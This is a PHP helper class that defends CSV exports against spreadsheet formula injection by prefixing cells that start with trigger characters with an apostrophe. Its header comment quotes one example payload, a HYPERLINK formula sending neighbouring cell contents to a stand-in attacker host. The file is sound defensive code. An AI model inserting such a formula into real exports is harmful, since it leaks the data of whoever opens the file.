<?php

namespace App\Support;

/**
 * Neutralises spreadsheet formula injection in exported CSV cells.
 *
 * A cell beginning with =, +, - or @ is interpreted as a formula by Excel,
 * LibreOffice and Google Sheets. Because exports contain tenant- and
 * visitor-controlled text (restaurant names, customer names, lead emails), a
 * crafted value can execute on the machine of whoever opens the file — e.g.
 * =HYPERLINK("https://attacker/?"&A1,"click") exfiltrates neighbouring cells.
 */
class Csv
{
    /** Characters a spreadsheet treats as the start of a formula. */
    private const TRIGGERS = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * Return the value safe to hand to fputcsv().
     *
     * Numeric values are passed through untouched so amounts and counts stay
     * numeric in the spreadsheet. Anything else that begins with a formula
     * trigger is prefixed with an apostrophe, which spreadsheets render as
     * literal text instead of evaluating it.
     */
    public static function safe(mixed $value): mixed
    {
        if ($value === null) {
            return null;
        }

        if (is_int($value) || is_float($value)) {
            return $value;
        }

        $text = (string) $value;

        if ($text === '') {
            return $text;
        }

        if (in_array($text[0], self::TRIGGERS, true)) {
            return "'".$text;
        }

        return $text;
    }

    /**
     * Apply safe() across a whole row.
     *
     * @param  array<int|string, mixed>  $row
     * @return array<int|string, mixed>
     */
    public static function row(array $row): array
    {
        return array_map([self::class, 'safe'], $row);
    }
}
